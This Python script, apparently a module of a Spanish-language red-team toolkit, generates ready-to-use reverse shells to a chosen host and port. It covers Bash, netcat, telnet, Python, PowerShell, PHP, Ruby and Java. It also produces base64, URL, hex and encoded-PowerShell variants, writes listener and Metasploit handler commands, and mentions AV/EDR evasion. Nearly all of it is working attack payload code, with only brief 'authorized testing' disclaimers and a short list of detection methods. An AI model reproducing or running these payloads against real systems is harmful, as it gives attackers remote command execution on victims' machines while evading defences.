
#!/usr/bin/env python3
"""
Reverse Shell Polyglot Generator - BOFA Red Team Module
Genera reverse shells en múltiples lenguajes y protocolos
"""

import base64
import urllib.parse
import argparse
import json
import os
from datetime import datetime

class ReverseShellGenerator:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport
        self.output_dir = "output/reverse_shells"
        
    def create_output_dir(self):
        os.makedirs(self.output_dir, exist_ok=True)
        
    def generate_bash_shell(self):
        """Genera reverse shell en Bash"""
        shells = {
            "bash_tcp": f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1",
            "bash_udp": f"bash -i >& /dev/udp/{self.lhost}/{self.lport} 0>&1",
            "nc_traditional": f"nc -e /bin/bash {self.lhost} {self.lport}",
            "nc_mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {self.lhost} {self.lport} >/tmp/f",
            "telnet": f"TF=$(mktemp -u);mkfifo $TF && telnet {self.lhost} {self.lport} 0<$TF | /bin/bash 1>$TF"
        }
        return shells
    
    def generate_python_shell(self):
        """Genera reverse shells en Python"""
        python_basic = f"""
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{self.lhost}",{self.lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
""".strip()

        python_threading = f"""
import socket,threading,subprocess
def shell():
    s=socket.socket()
    s.connect(("{self.lhost}",{self.lport}))
    while True:
        cmd=s.recv(1024).decode()
        if cmd=="exit":break
        result=subprocess.run(cmd,shell=True,capture_output=True,text=True)
        s.send((result.stdout+result.stderr).encode())
    s.close()
threading.Thread(target=shell).start()
""".strip()

        shells = {
            "python_basic": python_basic,
            "python_threading": python_threading,
            "python_oneliner": f'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'{self.lhost}\',{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/bash\',\'-i\'])"'
        }
        return shells
    
    def generate_powershell_shell(self):
        """Genera reverse shells en PowerShell"""
        ps_basic = f"""
$client = New-Object System.Net.Sockets.TCPClient("{self.lhost}",{self.lport})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()
""".strip()

        shells = {
            "powershell_basic": ps_basic,
            "powershell_encoded": f"powershell -enc {base64.b64encode(ps_basic.encode('utf-16le')).decode()}",
            "powershell_oneliner": f'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(\'{self.lhost}\',{self.lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"'
        }
        return shells
    
    def generate_php_shell(self):
        """Genera reverse shells en PHP"""
        php_basic = f"""
<?php
$sock=fsockopen("{self.lhost}",{self.lport});
exec("/bin/bash -i <&3 >&3 2>&3", $sock);
?>
""".strip()

        shells = {
            "php_basic": php_basic,
            "php_system": f'<?php system("bash -c \'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1\'"); ?>',
            "php_oneliner": f'php -r "$sock=fsockopen(\'{self.lhost}\',{self.lport});exec(\'/bin/bash -i <&3 >&3 2>&3\');"'
        }
        return shells
    
    def generate_ruby_shell(self):
        """Genera reverse shells en Ruby"""
        ruby_basic = f"""
require 'socket'
require 'open3'
s=TCPSocket.open("{self.lhost}",{self.lport})
while cmd = s.gets
  Open3.popen3(cmd) do |stdin, stdout, stderr, thread|
    s.print stdout.read
    s.print stderr.read  
  end
end
""".strip()

        shells = {
            "ruby_basic": ruby_basic,
            "ruby_oneliner": f'ruby -rsocket -e "f=TCPSocket.open(\'{self.lhost}\',{self.lport}).to_i;exec sprintf(\'/bin/bash -i <&%d >&%d 2>&%d\',f,f,f)"'
        }
        return shells
    
    def generate_java_shell(self):
        """Genera reverse shell en Java"""
        java_code = f"""
import java.io.*;
import java.net.*;

public class ReverseShell {{
    public static void main(String[] args) {{
        try {{
            Socket socket = new Socket("{self.lhost}", {self.lport});
            Process process = new ProcessBuilder("/bin/bash").redirectErrorStream(true).start();
            InputStream processOutput = process.getInputStream();
            OutputStream processInput = process.getOutputStream();
            InputStream socketInput = socket.getInputStream();
            OutputStream socketOutput = socket.getOutputStream();
            
            while(!socket.isClosed()) {{
                while(processOutput.available()>0) {{
                    socketOutput.write(processOutput.read());
                }}
                while(socketInput.available()>0) {{
                    processInput.write(socketInput.read());
                }}
                processInput.flush();
                socketOutput.flush();
                Thread.sleep(50);
                if(process.exitValue() != 0) {{
                    break;
                }}
            }}
        }} catch (Exception e) {{}}
    }}
}}
""".strip()

        return {"java_reverse_shell": java_code}
    
    def generate_encoded_variants(self, shells):
        """Genera variantes codificadas de los shells"""
        encoded = {}
        
        for name, shell in shells.items():
            if isinstance(shell, str):
                # Base64
                encoded[f"{name}_b64"] = base64.b64encode(shell.encode()).decode()
                # URL encode
                encoded[f"{name}_url"] = urllib.parse.quote(shell)
                # Hex encode
                encoded[f"{name}_hex"] = shell.encode().hex()
        
        return encoded
    
    def generate_listener_commands(self):
        """Genera comandos para listeners"""
        listeners = {
            "netcat": f"nc -lvnp {self.lport}",
            "netcat_verbose": f"nc -lvnp {self.lport} -v",
            "socat": f"socat -d -d TCP-LISTEN:{self.lport} STDOUT",
            "metasploit": f"use exploit/multi/handler\nset payload generic/shell_reverse_tcp\nset LHOST {self.lhost}\nset LPORT {self.lport}\nexploit",
            "python_listener": f"python3 -c \"import socket; s=socket.socket(); s.bind(('{self.lhost}', {self.lport})); s.listen(1); c,a=s.accept(); print(f'Connection from {{a}}'); [print(c.recv(1024).decode()) for _ in range(100)]\""
        }
        return listeners
    
    def save_shells_to_files(self, all_shells):
        """Guarda todos los shells en archivos separados"""
        files_created = []
        
        for category, shells in all_shells.items():
            category_dir = os.path.join(self.output_dir, category)
            os.makedirs(category_dir, exist_ok=True)
            
            for name, shell in shells.items():
                if category == "java":
                    filename = f"{name}.java"
                elif category == "php":
                    filename = f"{name}.php"
                elif category == "powershell":
                    filename = f"{name}.ps1"
                else:
                    filename = f"{name}.sh"
                
                filepath = os.path.join(category_dir, filename)
                with open(filepath, 'w') as f:
                    f.write(shell)
                files_created.append(filepath)
        
        return files_created
    
    def generate_master_report(self, all_shells, listeners, files_created):
        """Genera reporte maestro con todos los shells"""
        report = {
            "timestamp": datetime.now().isoformat(),
            "target": f"{self.lhost}:{self.lport}",
            "summary": {
                "total_shells": sum(len(shells) for shells in all_shells.values()),
                "categories": list(all_shells.keys()),
                "files_created": len(files_created)
            },
            "shells": all_shells,
            "listeners": listeners,
            "files": files_created,
            "usage_notes": [
                "Estos shells son para testing autorizado únicamente",
                "Configura listeners antes de ejecutar shells",
                "Usa shells apropiados según el sistema objetivo",
                "Considera evasión AV/EDR en entornos reales"
            ],
            "detection_methods": [
                "Network monitoring for outbound connections",
                "Process monitoring for suspicious executions", 
                "Command line monitoring",
                "Behavioral analysis for shell patterns"
            ]
        }
        
        report_file = os.path.join(self.output_dir, "reverse_shells_report.json")
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        return report_file

def main():
    parser = argparse.ArgumentParser(description="Reverse Shell Polyglot Generator")
    parser.add_argument("-l", "--lhost", required=True, help="IP del listener")
    parser.add_argument("-p", "--lport", required=True, type=int, help="Puerto del listener")
    parser.add_argument("-o", "--output", help="Directorio de salida")
    parser.add_argument("--encoded", action="store_true", help="Incluir variantes codificadas")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("🔴 BOFA Reverse Shell Polyglot Generator")
    print("⚠️  SOLO PARA TESTING AUTORIZADO")
    print("=" * 60)
    
    generator = ReverseShellGenerator(args.lhost, args.lport)
    
    if args.output:
        generator.output_dir = args.output
    
    generator.create_output_dir()
    
    try:
        # Generar shells por categoría
        all_shells = {
            "bash": generator.generate_bash_shell(),
            "python": generator.generate_python_shell(),
            "powershell": generator.generate_powershell_shell(),
            "php": generator.generate_php_shell(),
            "ruby": generator.generate_ruby_shell(),
            "java": generator.generate_java_shell()
        }
        
        # Generar variantes codificadas si se solicita
        if args.encoded:
            for category in list(all_shells.keys()):
                encoded = generator.generate_encoded_variants(all_shells[category])
                all_shells[f"{category}_encoded"] = encoded
        
        # Generar comandos de listener
        listeners = generator.generate_listener_commands()
        all_shells["listeners"] = listeners
        
        # Guardar archivos
        files_created = generator.save_shells_to_files(all_shells)
        
        # Generar reporte maestro
        report_file = generator.generate_master_report(all_shells, listeners, files_created)
        
        print(f"\n[✓] Shells generados para {args.lhost}:{args.lport}")
        print(f"[✓] {len(files_created)} archivos creados")
        print(f"[✓] Reporte maestro: {report_file}")
        print(f"\n[!] Configura tu listener: nc -lvnp {args.lport}")
        
    except Exception as e:
        print(f"[!] Error generando shells: {e}")

if __name__ == "__main__":
    main()
